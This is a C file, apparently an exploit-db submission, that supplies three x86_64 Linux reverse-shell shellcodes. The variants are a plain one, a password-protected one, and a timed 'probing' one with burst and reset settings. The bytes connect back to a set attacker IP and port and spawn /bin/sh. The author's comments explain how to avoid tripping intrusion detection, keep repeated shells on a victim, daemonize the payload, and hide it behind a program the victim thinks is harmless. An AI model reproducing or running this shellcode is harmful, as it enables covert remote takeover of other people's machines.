#include <stdio.h>
#include <string.h>
//|
//| Exploit Title: [linux x86_64 Subtle Probing Reverse Shell, Timer, Burst, Password, multi-Terminal (84, 122, 172 bytes)]
//| Date: [07/20/2016]
//| Exploit Author: [CripSlick]
//| Tested on: [Kali 2.0 Linux x86_64]
//| Version: [No program being used or exploited; I only relied syscalls]
//|
//|================================================================================================================
//|=====================  Why use Cripslick's Subtle Probing Reverse Shell??  =====================================
//|
//| 	This is a very big upgrade sense my last probing reverse shell, so if you thought the last
//| 	one was good for convenience, you will really like this one. The 3 main upgrades are. . .
//|
//| 1. 	There is a TIMER (VERY IMPORTANT!!!)
//|    	This means that you won't be flooding yourself with a thousand probes a second. This is
//|    	good because it is less CPU strain on the victim so the victim will less likly know something
//|    	is up but MUCH more importantly it will more likely bypass the IDS. The last one would be
//|    	sure to pop it (have a look at it in WireShark to know what I mean).
//|
//| 2. 	The byte count is lower. Upgrades such as not using Push+Pop or inc when moving one byte.
//|
//| 3. 	No Multi-Port because most of you won't be hacking your victim with multiple computers behind
//|    	a NAT; this helps you because it will lower the byte count. Also note that you will still get
//|   	a multi-terminal connection (every time your TIMER resets).
//|
//| 4. 	You can get a burst of Z probes up front (if you are ready beforehand) and then lower it to
//|		X probes later, at intervals of Y time so you don't awaken the IDS. Now you will have many claws
//|		on the victim without waiting hours (if set that long) for your new probes (backups) to come in .
//|		(A subtle scout makes for a silent killer)
//|
//|
//| 	   NOTE on Daemon: 	If you are using my Daemon C Skeleton, your shellcode will become a daemon
//|			   				and continue to run until you kill the PIDs or restart the victim's computer.
//|
//|
//|	    Why can't you use a timer for the bind shell and keep it to one port?
//|	    The reason is because the bind shell won't loose the process if you don't connect. Because
//|	    of that, you would be placing more and more processes on the victim machine until you
//|	    would DoS their system. With the reverse shell, the process dies as soon as you don't
//|	   	answer and that makes this an entirly different animal.
//|
//|	   	ps. The bind-shell indentation was skewed for exploit-db. today. For all of you coders here is
//|		what you should know. exploit-db uses the notpad++ sytel indentation. If you send them a gedit
//|		formated document your indentation will be off for your comments.
//|		If you want a nice indented format of my multi-terminal bind shell plesae go to my website,
//|		and thanks for looking.
//|
//|================================================================================================================
//|
//| ShepherdDowling@gmail.com
//| OffSec ID: OS-20614
//| http://50.112.22.183/
//|
//| 10.1.1.4	= 	"\x0a\x01\x01\x04"

  #define IPv4 		"\x0a\x01\x01\x04"		    		// in forward-byte-order
//|
  #define PORT	 	"\x15\xb5"  			    		// in forward-byte-order
//|
  #define PASSWORD	"\x6c\x61\x20\x63\x72\x69\x70\x73"  // in forward-byte-order
//|					python + 'la crips'[::1].encode('hex')
//|
  #define TIMER		"\x02\x01"  	//| in Reverse-Byte-Order
					//| convert hex to integer (not hex to ascii integer)
					//| Remmeber to comment out the TIMER sizes below that you are not using
					//| this example byte size \x10 = 16 seconds while word size \x02\x01 ~ 4 min
//|
  #define BURST		"\x05"	//| BURST happens on the first cycle. This is how many probs you will get initially
//|				//| The BURST happens before the first long timer kicks in (the other is a set sec)
				//| If I didn't have the sec long timer (in the code) you wouldn't be able to accept
				//| all the incomming traffic and would loose probs.
//|
  #define RESET		"\x01"  //| This applised to CODE3. The idea is to use the reset to stay in control without
				//| allarming the IDS (Burst to get what you need and then soft hits thereafter)
				//| example: Burst 5, reset 2, timer 3hrs
				//| 5 probs (3hrs) 2 probs (3hrs) 2 probs (3hrs) etc.
				//| This lets you get 5 terminals off the bat and if you loose connection you won't
				//| need to wait very long until the next backup probes come your way.
				//| This lets you connect even after your victim has the reverse shell launched
				//| The reason for the RESET is not be as aggressive as with the initial BURST.
				//| You don't want to trip any alarms, so good luck

//|================================================================================================================
//|****************************************************************************************************************
//|================================================================================================================


//|=====================!!!CHOSE ONLY ONE SHELLCODE!!!=========================
//| ===========================================================================
//| CODE1 Single Probe Reverse Shell & no PASSWORD (84 bytes)
//| ===========================================================================
//| I'm sure that this is not the shortest reverse shell you have seen but it
//| will pass my, "fill all registers test." If you don't know what I mean,
//| look below at my C code.


unsigned char CODE1[] = //| copy CODE1 and use it below <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

"\x48\x31\xff\x48\xf7\xe7\x48\x31\xf6\xb0\x29\x40\xb7\x02\x40\xb6\x01\x0f\x05\x48\x89"
"\xc7\x6a\x02\x66\xc7\x44\x24\x02"PORT"\xc7\x44\x24\x04"IPv4"\xb0\x2a\x48\x89\xe6\xb2"
"\x10\x0f\x05\x6a\x03\x5e\x48\xff\xce\xb0\x21\x0f\x05\x75\xf7\x48\x31\xf6\x48\xf7\xe6"
"\x56\x48\xb9\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x51\x54\x5f\xb0\x3b\x0f\x05"
;


//|=====================!!!CHOSE ONLY ONE SHELLCODE!!!===========================
//| =============================================================================
//| CODE2 Single Probe Reverse Shell with PASSWORD (122 bytes)
//| =============================================================================
//| You may think, I know why I want a password on a bind shell but why a revrse
//| shell? The answer is because you never know who may have access to your
//| computer. This is is mainly for safty for that and from probe theft.


unsigned char CODE2[] = //| copy CODE2 and use it below <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

"\x48\x31\xff\x48\xf7\xe7\x48\x31\xf6\xb0\x29\x40\xb7\x02\x40\xb6\x01\x0f\x05\x48\x89"
"\xc7\x6a\x02\x66\xc7\x44\x24\x02"PORT"\xc7\x44\x24\x04"IPv4"\xb0\x2a\x48\x89\xe6\xb2"
"\x10\x0f\x05\x6a\x03\x5e\x48\xff\xce\xb0\x21\x0f\x05\x75\xf7\x48\x89\xc7\x48\x89\xc6"
"\x48\x8d\x74\x24\xf0\x6a\x10\x5a\x0f\x05\x48\xb8"PASSWORD"\x48\x8d\x3e\x48\xaf\x74\x05"
"\x6a\x3c\x58\x0f\x05\x48\x31\xf6\x48\xf7\xe6\x56\x48\xb9\x2f\x2f\x62\x69\x6e\x2f\x73"
"\x68\x51\x54\x5f\xb0\x3b\x0f\x05"
;


//|=====================!!!CHOSE ONLY ONE SHELLCODE!!!===========================
//| =============================================================================
//| CODE3 Subtle Probing Reverse Shell + BURST + TIMER + RESET + Pass (172 bytes)
//| =============================================================================
//| You can only use a byte, word (2 bytes) or dword (4byte) timer. It doesn't
//| matter what you use but you must comment out what you don't use. In most
//| cases you will use the word size going from 4 min to 18 hrs.
//| The defaul is \x02\x01 (in reverse byte order) translate = 102 in hex
//| Thats ~ 4mins in hex (F0 = 4min exact)


unsigned char CODE3[] = //| copy CODE3 and use it below <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<


"\x48\x31\xdb\xb3"BURST"\x48\x31\xff\x48\xf7\xe7\x48\x31\xf6\xb0\x39\x0f\x05\x40\x38"
"\xf8\x74\x77\x48\x31\xf6\x48\xf7\xe6\xb0\x29\x40\xb7\x02\x40\xb6\x01\x0f\x05\x48\x89"
"\xc7\x6a\x02\x66\xc7\x44\x24\x02"PORT"\xc7\x44\x24\x04"IPv4"\xb0\x2a\x48\x89\xe6\xb2"
"\x10\x0f\x05\x6a\x03\x5e\x48\xff\xce\xb0\x21\x0f\x05\x75\xf7\x48\x89\xc7\x48\x89\xc6"
"\x48\x8d\x74\x24\xf0\x6a\x10\x5a\x0f\x05\x48\xb8"PASSWORD"\x48\x8d\x3e\x48\xaf\x74"
"\x05\x6a\x3c\x58\x0f\x05\x48\x31\xf6\x48\xf7\xe6\x56\x48\xb9\x2f\x2f\x62\x69\x6e\x2f"
"\x73\x68\x51\x54\x5f\xb0\x3b\x0f\x05\x48\xff\xcb\x38\xc3\x74\x05\x50\x6a\x01\xeb"


//| ATTENTION!!! COMMENT OUT THE TIMERS YOU ARE NOT GOING TO USE
//| BYTE size Timer
//	"\x05\xb3"RESET"\x50\x6a"TIMER"\x54\x5f\xb0\x23\x0f\x05\xe9\x5b\xff\xff\xff"

//| WORD Size Timer
	"\x07\xb3"RESET"\x50\x66\x68"TIMER"\x54\x5f\xb0\x23\x0f\x05\xe9\x59\xff\xff\xff"

//| DWORD Size Timer (It can't go above "\x77\x77\x77\x77")
//	"\x08\xb3"RESET"\x50\x68"TIMER"\x54\x5f\xb0\x23\x0f\x05\xe9\x58\xff\xff\xff

;

//|================================ VOID SHELLCODE =====================================
void SHELLCODE()
{
//	This part floods the registers to make sure the shellcode will always run
	__asm__("mov $0xAAAAAAAAAAAAAAAA, %rax\n\t"
		"mov %rax, %rbx\n\t" "mov %rax, %rcx\n\t" "mov %rax, %rdx\n\t"
		"mov %rax, %rsi\n\t" "mov %rax, %rdi\n\t" "mov %rax, %rbp\n\t"
		"mov %rax, %r10\n\t" "mov %rax, %r11\n\t" "mov %rax, %r12\n\t"
		"mov %rax, %r13\n\t" "mov %rax, %r14\n\t" "mov %rax, %r15\n\t"
		"call CODE3");  //1st paste CODEX<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
}

//|================================ VOID printBytes ====================================
void printBytes()
{
	printf("The CripSlick's code is %d Bytes Long\n",
		strlen(CODE3)); //2nd paste CODEX<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
}


//|================================ Int main ===========================================
int main ()
{


int pid = fork();  		// fork start
    if(pid == 0){ 		// pid always starts at 0

	SHELLCODE();		// launch void SHELLCODE
						// this is to represent a scenario where you bind to a good program
						// you always want your shellcode to run first

	}else if(pid > 0){	// pid will always be greater than 0 after the 1st process
						// this argument will always be satisfied

	printBytes();		// launch printBYTES
						// pretend that this is the one the victim thinks he is only using
	}
return 0;				// satisfy int main
system("exit");			// keeps our shellcode a daemon
}